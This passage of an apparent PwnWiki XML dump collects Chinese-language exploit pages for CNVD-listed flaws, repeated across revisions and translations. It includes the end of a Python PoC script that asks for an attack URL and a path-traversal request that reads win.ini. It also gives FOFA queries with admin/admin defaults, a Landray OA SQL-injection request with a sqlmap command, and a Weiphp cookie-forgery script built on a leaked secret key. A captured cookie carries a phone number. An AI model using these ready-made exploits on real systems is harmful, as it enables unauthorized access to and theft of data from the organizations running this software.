            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
&lt;/pre&gt;
==参考==
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html</text>
      <sha1>rg7qc1xa35zoow5pjueu40pukqltasd</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-68869 新開普電子股份有限公司 物聯網平台任意文件下載漏洞</title>
    <ns>0</ns>
    <id>5725</id>
    <revision>
      <id>6580</id>
      <timestamp>2021-07-08T13:41:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;translate&gt; 新開普電子股份有限公司 物聯網平台 &lt;/translate&gt;  ==POC== &lt;pre&gt; GET /api/device/foreignId//..."</comment>
      <origin>6580</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="537" sha1="rubg8nhkobosj2n5aan36o1v5u1nwjy" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;translate&gt;
新開普電子股份有限公司 物聯網平台
&lt;/translate&gt;

==POC==
&lt;pre&gt;
GET /api/device/foreignId//…%255c…%255c…%255c…%255c…%255c…%255c…%255c…%255cwindows/win.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Encoding: gzip,deflate
Host: target:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive
&lt;/pre&gt;</text>
      <sha1>rubg8nhkobosj2n5aan36o1v5u1nwjy</sha1>
    </revision>
    <revision>
      <id>6581</id>
      <parentid>6580</parentid>
      <timestamp>2021-07-08T13:42:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6581</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="559" sha1="4kepvb70b01iqf1b86m4yfsfqi7kodo" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
新開普電子股份有限公司 物聯網平台
&lt;/translate&gt;

==POC==
&lt;pre&gt;
GET /api/device/foreignId//…%255c…%255c…%255c…%255c…%255c…%255c…%255c…%255cwindows/win.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Encoding: gzip,deflate
Host: target:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive
&lt;/pre&gt;</text>
      <sha1>4kepvb70b01iqf1b86m4yfsfqi7kodo</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-00876 Wayos AC集中管理系統默認弱口令</title>
    <ns>0</ns>
    <id>2319</id>
    <revision>
      <id>2755</id>
      <timestamp>2021-05-10T02:49:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; title="AC集中管理系统" &lt;/pre&gt;  ==默認信息== &lt;pre&gt; admin/admin &lt;/pre&gt;"</comment>
      <origin>2755</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="93" sha1="hxyn3ywtt7ey8vldcedb9798aay4imh" xml:space="preserve">==FOFA==
&lt;pre&gt;
title="AC集中管理系统"
&lt;/pre&gt;

==默認信息==
&lt;pre&gt;
admin/admin
&lt;/pre&gt;</text>
      <sha1>hxyn3ywtt7ey8vldcedb9798aay4imh</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-01363 藍凌OA EKP 後台SQL注入漏洞</title>
    <ns>0</ns>
    <id>449</id>
    <revision>
      <id>647</id>
      <timestamp>2021-03-25T01:59:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響==  2021-3-24 前版本 &lt;/translate&gt;  &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 存在SQL注入的 Url為: &lt;/translate&gt; &lt;p..."</comment>
      <origin>647</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2553" sha1="trfnz37dnlv8vgrmdmgm4tvbeley9xa" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==

2021-3-24 前版本
&lt;/translate&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
存在SQL注入的 Url為:
&lt;/translate&gt;
&lt;pre&gt;
https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true
&lt;/pre&gt;

&lt;translate&gt;
其中存在SQL注入的參數為 ordeby ， 數據包如下:
&lt;/translate&gt;

&lt;pre&gt;
GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; j_lang=zh-CN; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616568455; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616568455; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616568455; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; add_customer=0; JSESSIONID=F4A2DFFF611470A0AA00C1B4CEB0800B; LtpaToken=AAECAzYwNUI0NTRBNjA1QkVFMEFsaXd3MjYdcI6ajDXZSNpXOsKhMSNAGaQ=; original_name=16b53df64e78c7c0ab2d4e54165a6415; roletype=%E6%A8%A1%E5%9D%97%E7%AE%A1%E7%90%86%E5%91%98; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616594251
&lt;/pre&gt;



&lt;translate&gt;
保存為文件，使用 Sqlmap 注入:
&lt;/translate&gt;

&lt;pre&gt;
sqlmap -r sql.txt -p orderby --dbs
&lt;/pre&gt;


&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://mp.weixin.qq.com/s/jnmB8h9UCztt-FL3aKmn0g</text>
      <sha1>trfnz37dnlv8vgrmdmgm4tvbeley9xa</sha1>
    </revision>
    <revision>
      <id>648</id>
      <parentid>647</parentid>
      <timestamp>2021-03-25T01:59:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>648</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2630" sha1="a6vqqnabohzt7fqzi8sk6b8b06lpsis" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;

&lt;!--T:2--&gt;
2021-3-24 前版本
&lt;/translate&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:3--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
存在SQL注入的 Url為:
&lt;/translate&gt;
&lt;pre&gt;
https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:5--&gt;
其中存在SQL注入的參數為 ordeby ， 數據包如下:
&lt;/translate&gt;

&lt;pre&gt;
GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; j_lang=zh-CN; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616568455; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616568455; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616568455; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; add_customer=0; JSESSIONID=F4A2DFFF611470A0AA00C1B4CEB0800B; LtpaToken=AAECAzYwNUI0NTRBNjA1QkVFMEFsaXd3MjYdcI6ajDXZSNpXOsKhMSNAGaQ=; original_name=16b53df64e78c7c0ab2d4e54165a6415; roletype=%E6%A8%A1%E5%9D%97%E7%AE%A1%E7%90%86%E5%91%98; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616594251
&lt;/pre&gt;



&lt;translate&gt;
&lt;!--T:6--&gt;
保存為文件，使用 Sqlmap 注入:
&lt;/translate&gt;

&lt;pre&gt;
sqlmap -r sql.txt -p orderby --dbs
&lt;/pre&gt;


&lt;translate&gt;
==參考== &lt;!--T:7--&gt;
&lt;/translate&gt;
https://mp.weixin.qq.com/s/jnmB8h9UCztt-FL3aKmn0g</text>
      <sha1>a6vqqnabohzt7fqzi8sk6b8b06lpsis</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-01363 藍凌OA EKP 後台SQL注入漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3556</id>
    <revision>
      <id>4131</id>
      <timestamp>2021-06-06T09:05:05Z</timestamp>
      <contributor>
        <username>Xl199928</username>
        <id>290</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>4131</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2403" sha1="ipepbidz5pttoak3ddaooz3jt6fn9ry" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==

2021-3-24 前版本

==漏洞利用==

存在SQL注入的 Url为:
&lt;pre&gt;
https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true
&lt;/pre&gt;

其中存在SQL注入的参数为 ordeby ， 数据包如下:

&lt;pre&gt;
GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; j_lang=zh-CN; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616568455; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616568455; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616568455; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; add_customer=0; JSESSIONID=F4A2DFFF611470A0AA00C1B4CEB0800B; LtpaToken=AAECAzYwNUI0NTRBNjA1QkVFMEFsaXd3MjYdcI6ajDXZSNpXOsKhMSNAGaQ=; original_name=16b53df64e78c7c0ab2d4e54165a6415; roletype=%E6%A8%A1%E5%9D%97%E7%AE%A1%E7%90%86%E5%91%98; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616594251
&lt;/pre&gt;



保存为文件，使用 Sqlmap 注入:

&lt;pre&gt;
sqlmap -r sql.txt -p orderby --dbs
&lt;/pre&gt;


==参考==
https://mp.weixin.qq.com/s/jnmB8h9UCztt-FL3aKmn0g</text>
      <sha1>ipepbidz5pttoak3ddaooz3jt6fn9ry</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-01363 藍凌OA EKP 後台SQL注入漏洞/zh-hant</title>
    <ns>0</ns>
    <id>2961</id>
    <revision>
      <id>3462</id>
      <timestamp>2021-05-26T13:28:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "其中存在SQL注入的參數為 ordeby ， 數據包如下:"</comment>
      <origin>3462</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2403" sha1="ssrcwnv96e7jbf36wmmcp4ds7wze9ev" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==

2021-3-24 前版本

==漏洞利用==

存在SQL注入的 Url為:
&lt;pre&gt;
https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true
&lt;/pre&gt;

其中存在SQL注入的參數為 ordeby ， 數據包如下:

&lt;pre&gt;
GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; j_lang=zh-CN; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616568455; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616568455; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616568455; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; add_customer=0; JSESSIONID=F4A2DFFF611470A0AA00C1B4CEB0800B; LtpaToken=AAECAzYwNUI0NTRBNjA1QkVFMEFsaXd3MjYdcI6ajDXZSNpXOsKhMSNAGaQ=; original_name=16b53df64e78c7c0ab2d4e54165a6415; roletype=%E6%A8%A1%E5%9D%97%E7%AE%A1%E7%90%86%E5%91%98; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616594251
&lt;/pre&gt;



保存為文件，使用 Sqlmap 注入:

&lt;pre&gt;
sqlmap -r sql.txt -p orderby --dbs
&lt;/pre&gt;


==參考==
https://mp.weixin.qq.com/s/jnmB8h9UCztt-FL3aKmn0g</text>
      <sha1>ssrcwnv96e7jbf36wmmcp4ds7wze9ev</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-01929 安徽陽光心健 心理測量平台 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>2507</id>
    <revision>
      <id>2998</id>
      <timestamp>2021-05-21T01:19:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; icon_hash="-320896955" &lt;/pre&gt;  ==漏洞利用== 訪問 &lt;pre&gt; http://xxx.xxx.xxx.xxx/admin/ &lt;/pre&gt;  其中 &lt;pre&gt; http://xxx.xxx.xxx.xxx/admin/UserFiles/ &lt;/pre&gt;..."</comment>
      <origin>2998</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="222" sha1="g4fhxky4qzbeflw0vletjcb33eqi711" xml:space="preserve">==FOFA==
&lt;pre&gt;
icon_hash="-320896955"
&lt;/pre&gt;

==漏洞利用==
訪問
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/admin/
&lt;/pre&gt;

其中
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/admin/UserFiles/
&lt;/pre&gt;
包含了用戶信息，可以未授權下載。</text>
      <sha1>g4fhxky4qzbeflw0vletjcb33eqi711</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-09693 Weiphp5.0 任意用戶Cookie偽造漏洞</title>
    <ns>0</ns>
    <id>909</id>
    <revision>
      <id>1177</id>
      <timestamp>2021-04-08T03:55:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Weiphp &lt;= 5.0 &lt;/pre&gt;   &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 首先需要得到數據庫配置..."</comment>
      <origin>1177</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4803" sha1="fz79mvmqbn4m61agy9fo1nm0r2la892" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
首先需要得到數據庫配置文件中的&lt;code&gt;data_auth_key&lt;/code&gt;密鑰
&lt;/translate&gt;

[[File:Weiphp-15.png |800px]]

&lt;translate&gt;
得到這個配置文件可參考 [https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞]
&lt;/translate&gt;


&lt;pre&gt;
'data_auth_key' =&gt; '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T'
&lt;/pre&gt;


&lt;translate&gt;
全局查找使用了這個密鑰的地方:
&lt;/translate&gt;

[[File:Weiphp-16.png |800px]]


&lt;translate&gt;
找到了跟據這個密鑰的加密方法和解密方法
&lt;/translate&gt;


&lt;translate&gt;
加密方法 &lt;code&gt;think_encrypt&lt;/code&gt;
&lt;/translate&gt;

&lt;pre&gt;

function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
&lt;/pre&gt;

&lt;translate&gt;
解密方法 &lt;code&gt;think_decrypt&lt;/code&gt;
&lt;/translate&gt;

&lt;pre&gt;
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire &gt; 0 &amp;&amp; $expire &lt; time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i &lt; $len; $i++) {
        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
&lt;/pre&gt;

&lt;translate&gt;
在文件 &lt;code&gt;application\common.php&lt;/code&gt; 中含有使用解密方法的代碼，用於做身份驗證
&lt;/translate&gt;

&lt;pre&gt;
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')-&gt;autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
&lt;/pre&gt;

&lt;translate&gt;
根據這裡得到的代碼，可以知道當user_Id=1時,會解密密鑰後判斷是否正確，如果正確則可以登錄系統

我們在本地使用加密代碼加密user_id=1得到的cookie則可以登錄系統
&lt;/translate&gt;

&lt;pre&gt;
&lt;?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?&gt;
&lt;/pre&gt;


&lt;translate&gt;
添加&lt;code&gt;cookie: user_id=xxxxxxxx&lt;/code&gt;即可成功登錄
&lt;/translate&gt;

[[File:Weiphp-18.png |800px]]


&lt;translate&gt;
==參考==
&lt;/translate&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html</text>
      <sha1>fz79mvmqbn4m61agy9fo1nm0r2la892</sha1>
    </revision>
    <revision>
      <id>1178</id>
      <parentid>1177</parentid>
      <timestamp>2021-04-08T03:56:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1178</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4950" sha1="ini1ou4zt7q8q33abcyfy9l8c9jmc7b" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
首先需要得到數據庫配置文件中的&lt;code&gt;data_auth_key&lt;/code&gt;密鑰
&lt;/translate&gt;

[[File:Weiphp-15.png |800px]]

&lt;translate&gt;
&lt;!--T:4--&gt;
得到這個配置文件可參考 [https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞]
&lt;/translate&gt;


&lt;pre&gt;
'data_auth_key' =&gt; '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T'
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:5--&gt;
全局查找使用了這個密鑰的地方:
&lt;/translate&gt;

[[File:Weiphp-16.png |800px]]


&lt;translate&gt;
&lt;!--T:6--&gt;
找到了跟據這個密鑰的加密方法和解密方法
&lt;/translate&gt;


&lt;translate&gt;
&lt;!--T:7--&gt;
加密方法 &lt;code&gt;think_encrypt&lt;/code&gt;
&lt;/translate&gt;

&lt;pre&gt;

function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

